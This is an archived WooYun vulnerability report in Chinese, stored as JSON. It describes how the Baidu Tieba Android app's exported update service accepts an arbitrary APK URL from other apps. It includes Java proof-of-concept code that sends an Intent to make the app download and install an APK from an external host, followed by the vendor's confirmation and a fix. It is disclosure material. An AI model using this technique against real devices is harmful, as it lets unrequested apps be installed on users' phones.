{"id": 82637, "wybug_id": "wooyun-2015-0150443", "wybug_title": "百度贴吧安卓版升级漏洞", "wybug_corp": "百度", "wybug_author": "tmplazy", "wybug_date": "2015-11-06 11:18", "wybug_open_date": "2015-12-17 14:48", "wybug_type": "设计错误/逻辑缺陷", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["设计缺陷"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-11-06：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-11-06：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-09：\t细节向第三方安全合作伙伴开放（绿盟科技、唐朝安全巡航）\t\t\t\t\t\t\t\t\t2015-12-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2016-01-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2016-01-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-17：\t细节向公众公开  简要描述： 百度贴吧安卓版升级漏洞。。 详细说明：  \n\n通过service的名字可以看出这个是tieba的更新服务，而且该服务可以由外部程序访问。\n\n\n\n该服务的onStart函数，可以非常明显的看到url是可以控制的。\nthis.mMainApkUrl = arg4.getStringExtra(\"key_tieba_apk_url\");\n就是上面这行代码，可以传入自己想要的安装的apk的url。然后是我的测试代码，我将url指向了豌豆荚下的天天消消乐。。。。\nIntent intent_2 = new Intent();                intent_2.setComponent(new ComponentName(\"com.baidu.tieba\", \"com.baidu.tieba.service.TiebaUpdateService\"));                intent_2.putExtra(\"key_tieba_apk_url\", \"http://**.**.**.**/apps/com.happyelements.AndroidAnimal.wdj/download\");                VersionData versionData = new VersionData();                intent_2.putExtra(\"tieba_apk_data\",versionData);                startService(intent_2);\n\n\n安装时已经是开心消消乐的程序了。。最后是我的测试程序链接http://**.**.**.**/s/1mgrPz88提取码 fdib   漏洞证明：  \n\n   修复方案：  修改该组件的exported为false，或者将更新的URL固定。   版权声明：转载请注明来源 tmplazy@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：10  确认时间：2015-11-06 11:45 厂商回复： 非常感谢您的报告，问题已着手处理，感谢您对百度安全的关注。如果您有任何疑问，欢迎反馈，我们会有专人跟进处理。 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 10, "Ranks": null}